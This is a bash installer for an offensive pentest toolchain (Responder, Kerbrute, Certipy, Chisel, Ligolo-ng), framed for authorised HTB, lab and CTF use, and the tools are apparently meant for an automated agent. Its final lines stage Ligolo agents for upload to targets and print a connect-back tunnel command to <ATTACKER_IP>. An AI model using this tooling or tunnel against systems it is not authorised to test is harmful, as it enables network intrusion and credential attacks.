#!/usr/bin/env bash
# install-tools.sh — Idempotent installer for the Nest's offensive toolchain.
#
# Splits into two halves:
#   1. apt packages   (need root → run this script with sudo)
#   2. release binaries into ~/.local/bin and workspace tools/ (no root)
#
# Usage:
#   sudo bash scripts/install-tools.sh          # everything
#   bash scripts/install-tools.sh --binaries    # only the no-root half
#
# Safe to re-run: skips anything already present. Frames: authorized
# HTB / lab / CTF use on a Kali attacker host.

set -uo pipefail
WS="$(cd "$(dirname "$0")/.." && pwd)"
BIN="$HOME/.local/bin"
# When run under sudo, install binaries for the invoking (non-root) user.
if [[ -n "${SUDO_USER:-}" ]]; then
  REAL_HOME=$(getent passwd "$SUDO_USER" | cut -d: -f6)
  BIN="$REAL_HOME/.local/bin"
fi
mkdir -p "$BIN" "$WS/tools/ligolo"

have() { command -v "$1" >/dev/null 2>&1; }

install_apt() {
  echo "── apt packages (responder, john, sshuttle, certipy-ad, proxychains4) ──"
  export DEBIAN_FRONTEND=noninteractive
  apt-get update -qq || true
  # Kali package names. certipy-ad provides `certipy`.
  for pkg in responder john sshuttle proxychains4 certipy-ad seclists; do
    if dpkg -s "$pkg" >/dev/null 2>&1; then
      echo "  [=] $pkg already installed"
    else
      echo "  [+] apt install $pkg"
      apt-get install -y "$pkg" || echo "  [!] $pkg failed (skipping)"
    fi
  done
}

dl_chisel() {
  have chisel && { echo "  [=] chisel present"; return; }
  local url; url=$(curl -s https://api.github.com/repos/jpillora/chisel/releases/latest \
    | grep -oE '"browser_download_url": *"[^"]*linux_amd64.gz"' | head -1 | cut -d'"' -f4)
  echo "  [+] chisel <- $url"
  curl -sL "$url" -o /tmp/chisel.gz && gunzip -f /tmp/chisel.gz && chmod +x /tmp/chisel && mv /tmp/chisel "$BIN/chisel"
}

dl_kerbrute() {
  have kerbrute && { echo "  [=] kerbrute present"; return; }
  local url; url=$(curl -s https://api.github.com/repos/ropnop/kerbrute/releases/latest \
    | grep -oE '"browser_download_url": *"[^"]*kerbrute_linux_amd64"' | head -1 | cut -d'"' -f4)
  echo "  [+] kerbrute <- $url"
  curl -sL "$url" -o "$BIN/kerbrute" && chmod +x "$BIN/kerbrute"
}

dl_ligolo() {
  local assets proxy agent wagent
  assets=$(curl -s https://api.github.com/repos/nicocha30/ligolo-ng/releases/latest \
    | grep -oE '"browser_download_url": *"[^"]*"' | cut -d'"' -f4)
  if ! have ligolo-proxy; then
    proxy=$(echo "$assets" | grep -E 'proxy_.*linux_amd64.tar.gz' | head -1)
    echo "  [+] ligolo-proxy <- $proxy"
    curl -sL "$proxy" -o /tmp/lproxy.tgz && tar xzf /tmp/lproxy.tgz -C /tmp proxy \
      && mv /tmp/proxy "$BIN/ligolo-proxy" && chmod +x "$BIN/ligolo-proxy"
  else
    echo "  [=] ligolo-proxy present"
  fi
  # Stage agents for upload to targets (local only, gitignored).
  agent=$(echo "$assets"  | grep -E 'agent_.*linux_amd64.tar.gz' | head -1)
  wagent=$(echo "$assets" | grep -E 'agent_.*windows_amd64.zip'  | head -1)
  [[ -f "$WS/tools/ligolo/agent-linux-amd64" ]] || {
    echo "  [+] ligolo linux agent"
    curl -sL "$agent" -o /tmp/lagent.tgz && tar xzf /tmp/lagent.tgz -C /tmp agent \
      && mv /tmp/agent "$WS/tools/ligolo/agent-linux-amd64" && chmod +x "$WS/tools/ligolo/agent-linux-amd64"; }
  [[ -f "$WS/tools/ligolo/agent-windows-amd64.exe" ]] || {
    echo "  [+] ligolo windows agent"
    curl -sL "$wagent" -o /tmp/wagent.zip && unzip -o /tmp/wagent.zip agent.exe -d "$WS/tools/ligolo" >/dev/null 2>&1 \
      && mv "$WS/tools/ligolo/agent.exe" "$WS/tools/ligolo/agent-windows-amd64.exe" 2>/dev/null || true; }
}

link_path_fixes() {
  # Kali ships responder/john in /usr/sbin (not in a normal user PATH), and
  # certipy is packaged as `certipy-ad`. Symlink into $BIN so the agent
  # (running as the non-root user) can invoke them by their expected names.
  echo "── PATH fixes (symlink sbin tools + certipy into $BIN) ──"
  [[ -x /usr/sbin/responder ]] && ln -sf /usr/sbin/responder "$BIN/responder" && echo "  [+] responder -> $BIN"
  [[ -x /usr/sbin/john ]]      && ln -sf /usr/sbin/john      "$BIN/john"      && echo "  [+] john -> $BIN"
  if ! have certipy; then
    for c in /usr/bin/certipy-ad /usr/local/bin/certipy-ad; do
      [[ -x "$c" ]] && ln -sf "$c" "$BIN/certipy" && echo "  [+] certipy -> $c" && break
    done
  fi
}

install_binaries() {
  echo "── release binaries into $BIN ──"
  dl_chisel; dl_kerbrute; dl_ligolo; link_path_fixes
  # Fix ownership if we ran the binary half under sudo.
  if [[ -n "${SUDO_USER:-}" ]]; then
    chown -R "$SUDO_USER":"$SUDO_USER" "$BIN" "$WS/tools" 2>/dev/null || true
  fi
}

if [[ "${1:-}" == "--binaries" ]]; then
  install_binaries
else
  if [[ "$(id -u)" -ne 0 ]]; then
    echo "⚠️  apt packages need root. Re-run with: sudo bash scripts/install-tools.sh"
    echo "   (or 'bash scripts/install-tools.sh --binaries' for the no-root half only)"
    exit 1
  fi
  install_apt
  install_binaries
fi

echo ""
echo "── verify ──"
for t in nmap ffuf feroxbuster nxc netexec impacket-secretsdump evil-winrm \
         bloodhound-python certipy responder john hashcat searchsploit \
         chisel ligolo-proxy kerbrute proxychains4 sshuttle; do
  printf "  %-22s" "$t"
  # Check the invoking user's ~/.local/bin too (root PATH lacks it under sudo).
  if have "$t" || [[ -x "$BIN/$t" ]]; then echo OK; else echo MISSING; fi
done
echo ""
echo "Ligolo agents staged in tools/ligolo/ (upload to target, then run:"
echo "  attacker: sudo ip tuntap add user \$USER mode tun ligolo && sudo ip link set ligolo up && ligolo-proxy -selfcert"
echo "  target:   ./agent-linux-amd64 -connect <ATTACKER_IP>:11601 -ignore-cert )"
